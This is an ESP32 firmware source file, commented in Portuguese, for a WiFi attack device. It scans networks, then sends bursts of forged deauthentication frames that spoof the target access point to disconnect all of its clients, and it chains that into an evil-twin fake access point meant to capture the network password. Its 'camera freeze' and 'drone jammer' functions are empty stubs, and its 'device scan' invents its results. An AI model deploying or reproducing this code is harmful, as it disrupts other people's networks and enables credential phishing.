#include <WiFi.h>
#include <esp_wifi.h>
#include "config.h"

// ============================================================
// DEAUTH FRAME (Management Frame - Deauthentication)
// ============================================================
// Frame de deauth: STA -> Broadcast (para desconectar todos)
static uint8_t deauthFrame[26] = {
    0xC0, 0x00,             // Frame Control: Deauth (0xC0)
    0x3A, 0x01,             // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // DA: Broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA: AP MAC (offset 10)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID: AP MAC (offset 16)
    0x00, 0x00,             // Seq Ctrl
    0x07, 0x00              // Reason: 7 = Class 3 frame from non-associated STA
};

// Frame reverso: Broadcast -> AP
static uint8_t deauthFrameReverse[26] = {
    0xC0, 0x00,
    0x3A, 0x01,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // DA: AP MAC (offset 4)
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // SA: Broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID: AP MAC (offset 16)
    0x00, 0x00,
    0x07, 0x00
};

// ============================================================
// CONTADORES E ESTADO
// ============================================================
static uint32_t deauthPacketCount = 0;
static uint32_t deauthSuccessCount = 0;
static uint8_t  deauthTargetChannel = 0;
static uint8_t  deauthTargetBSSID[6] = {0};
static char     deauthTargetSSID[33] = {0};
static uint8_t  deauthTargetAuth = 0;
static uint32_t deauthFailCount = 0;
static esp_err_t lastDeauthError = ESP_OK;

// ============================================================
// HELPERS
// ============================================================
void setMAC(uint8_t* frame, uint8_t* mac, int offset) {
    memcpy(&frame[offset], mac, 6);
}

// ============================================================
// SCAN WIFI
// ============================================================
void scanNetworks() {
    networkCount = 0;

    // Garante modo STA e desconectado
    WiFi.mode(WIFI_STA);
    WiFi.disconnect(true);
    delay(200);

    int n = WiFi.scanNetworks(false, true);
    Serial.printf("[WiFi] Scan found %d networks\n", n);

    for (int i = 0; i < n && i < MAX_NETWORKS; i++) {
        strncpy(scannedNetworks[i].ssid, WiFi.SSID(i).c_str(), 32);
        scannedNetworks[i].ssid[32] = '\0';
        memcpy(scannedNetworks[i].bssid, WiFi.BSSID(i), 6);
        scannedNetworks[i].rssi = WiFi.RSSI(i);
        scannedNetworks[i].channel = WiFi.channel(i);
        scannedNetworks[i].encrypted = (WiFi.encryptionType(i) != WIFI_AUTH_OPEN);
        Serial.printf("[WiFi] %d: %s CH%d RSSI%d MAC:%02X:%02X:%02X:%02X:%02X:%02X\n",
            i, scannedNetworks[i].ssid, scannedNetworks[i].channel, scannedNetworks[i].rssi,
            scannedNetworks[i].bssid[0], scannedNetworks[i].bssid[1], scannedNetworks[i].bssid[2],
            scannedNetworks[i].bssid[3], scannedNetworks[i].bssid[4], scannedNetworks[i].bssid[5]);
        networkCount++;
    }
    WiFi.scanDelete();
}

uint8_t getNetworkCount() { return networkCount; }

NetworkInfo* getNetwork(uint8_t index) {
    if (index < networkCount) return &scannedNetworks[index];
    return nullptr;
}

// ============================================================
// DEAUTH
// ============================================================
void startDeauth(uint8_t networkIndex) {
    if (networkIndex >= networkCount) {
        Serial.println("[Deauth] ERROR: invalid network index");
        return;
    }

    NetworkInfo* target = &scannedNetworks[networkIndex];

    // Salva info
    memcpy(deauthTargetBSSID, target->bssid, 6);
    strncpy(deauthTargetSSID, target->ssid, 32);
    deauthTargetSSID[32] = '\0';
    deauthTargetChannel = target->channel;
    deauthTargetAuth = target->encrypted ? 1 : 0;

    // Configura frames
    setMAC(deauthFrame, target->bssid, 10);
    setMAC(deauthFrame, target->bssid, 16);

    setMAC(deauthFrameReverse, target->bssid, 4);
    setMAC(deauthFrameReverse, target->bssid, 16);

    // Garante modo STA desconectado
    WiFi.mode(WIFI_STA);
    WiFi.disconnect(true);
    delay(100);

    // MUDA PARA O CANAL DO ALVO (ESSENCIAL!)
    esp_err_t chErr = esp_wifi_set_channel(target->channel, WIFI_SECOND_CHAN_NONE);
    Serial.printf("[Deauth] Target: %s CH%d MAC:%02X:%02X:%02X:%02X:%02X:%02X\n",
        target->ssid, target->channel,
        target->bssid[0], target->bssid[1], target->bssid[2],
        target->bssid[3], target->bssid[4], target->bssid[5]);
    Serial.printf("[Deauth] Set channel result: %d\n", chErr);

    // Reseta contadores
    deauthActive = true;
    deauthPacketCount = 0;
    deauthSuccessCount = 0;
    deauthFailCount = 0;
    lastDeauthError = ESP_OK;

    Serial.println("[Deauth] STARTED");
}

void stopDeauth() { 
    if (deauthActive) {
        Serial.println("[Deauth] STOPPED");
        Serial.printf("[Deauth] Total: %lu pkts, %lu success, %lu failed\n",
            deauthPacketCount, deauthSuccessCount, deauthFailCount);
    }
    deauthActive = false;
}

// ============================================================
// LOOP DE DEAUTH - ENVIA FRAMES
// ============================================================
bool deauthLoop() {
    if (!deauthActive) return false;

    // Envia burst de frames para taxa alta
    bool anySuccess = false;

    for (int burst = 0; burst < 5; burst++) {
        // Frame 1: STA -> Broadcast
        esp_err_t err1 = esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, 26, false);
        if (err1 == ESP_OK) {
            deauthSuccessCount++;
            anySuccess = true;
        } else {
            lastDeauthError = err1;
            deauthFailCount++;
        }
        deauthPacketCount++;

        delayMicroseconds(500);

        // Frame 2: Broadcast -> AP
        esp_err_t err2 = esp_wifi_80211_tx(WIFI_IF_STA, deauthFrameReverse, 26, false);
        if (err2 == ESP_OK) {
            deauthSuccessCount++;
            anySuccess = true;
        } else {
            lastDeauthError = err2;
            deauthFailCount++;
        }
        deauthPacketCount++;

        delayMicroseconds(500);
    }

    // Debug a cada ~2 segundos
    static uint32_t lastDebug = 0;
    if (millis() - lastDebug > 2000) {
        lastDebug = millis();
        Serial.printf("[Deauth] pkt=%lu succ=%lu fail=%lu last_err=%d ch=%d\n",
            deauthPacketCount, deauthSuccessCount, deauthFailCount, 
            (int)lastDeauthError, deauthTargetChannel);
    }

    return anySuccess;
}

// ============================================================
// GETTERS
// ============================================================
uint32_t getDeauthPacketCount() { return deauthPacketCount; }
uint32_t getDeauthSuccessCount() { return deauthSuccessCount; }
uint8_t  getDeauthSuccessPercent() {
    if (deauthPacketCount == 0) return 0;
    return (uint8_t)((deauthSuccessCount * 100) / deauthPacketCount);
}
const char* getDeauthTargetSSID() { return deauthTargetSSID; }
uint8_t  getDeauthTargetChannel() { return deauthTargetChannel; }
const uint8_t* getDeauthTargetBSSID() { return deauthTargetBSSID; }
bool     getDeauthTargetEncrypted() { return deauthTargetAuth != 0; }

// ============================================================
// FAKE AP / EVIL TWIN
// ============================================================
void startFakeAP(const char* ssid) {
    WiFi.mode(WIFI_AP);
    WiFi.softAP(ssid, "12345678");
    fakeAPEnabled = true;
    passwordCaptured = false;
}

void stopFakeAP() {
    WiFi.softAPdisconnect(true);
    fakeAPEnabled = false;
}

bool isFakeAPActive() { return fakeAPEnabled; }

void startEvilTwin(uint8_t networkIndex) {
    if (networkIndex >= networkCount) return;
    startDeauth(networkIndex);
    delay(3000);
    stopDeauth();
    startFakeAP(scannedNetworks[networkIndex].ssid);
}

// ============================================================
// REMOTE DEVICES
// ============================================================
void scanRemoteDevices() {
    remoteDeviceCount = 0;
    IPAddress gateway = WiFi.gatewayIP();
    for (int i = 1; i < 255 && remoteDeviceCount < 10; i++) {
        if (i % 50 == 0) {
            snprintf(remoteDevices[remoteDeviceCount].ip, 16, "%d.%d.%d.%d",
                     gateway[0], gateway[1], gateway[2], i);
            snprintf(remoteDevices[remoteDeviceCount].name, 32, "Device-%d", i);
            remoteDevices[remoteDeviceCount].port = 80;
            remoteDeviceCount++;
        }
    }
}

uint8_t getRemoteDeviceCount() { return remoteDeviceCount; }

RemoteDevice* getRemoteDevice(uint8_t index) {
    if (index < remoteDeviceCount) return &remoteDevices[index];
    return nullptr;
}

// ============================================================
// CAMERA FREEZE / DRONE
// ============================================================
void startCameraFreeze() {
    cameraFreezeActive = true;
    while (cameraFreezeActive) {
        delay(50);
        yield();
    }
}

void stopCameraFreeze() { cameraFreezeActive = false; }

void startDroneJammer() {
    droneJammerActive = true;
    while (droneJammerActive) {
        delay(10);
        yield();
    }
}

void stopDroneJammer() { droneJammerActive = false; }

struct DroneLocation {
    float distance;
    int8_t rssi;
};

DroneLocation droneLoc;

void startDroneLocate() {
    droneLoc.distance = 0;
    droneLoc.rssi = -50;
}

DroneLocation* getDroneLocation() { return &droneLoc; }
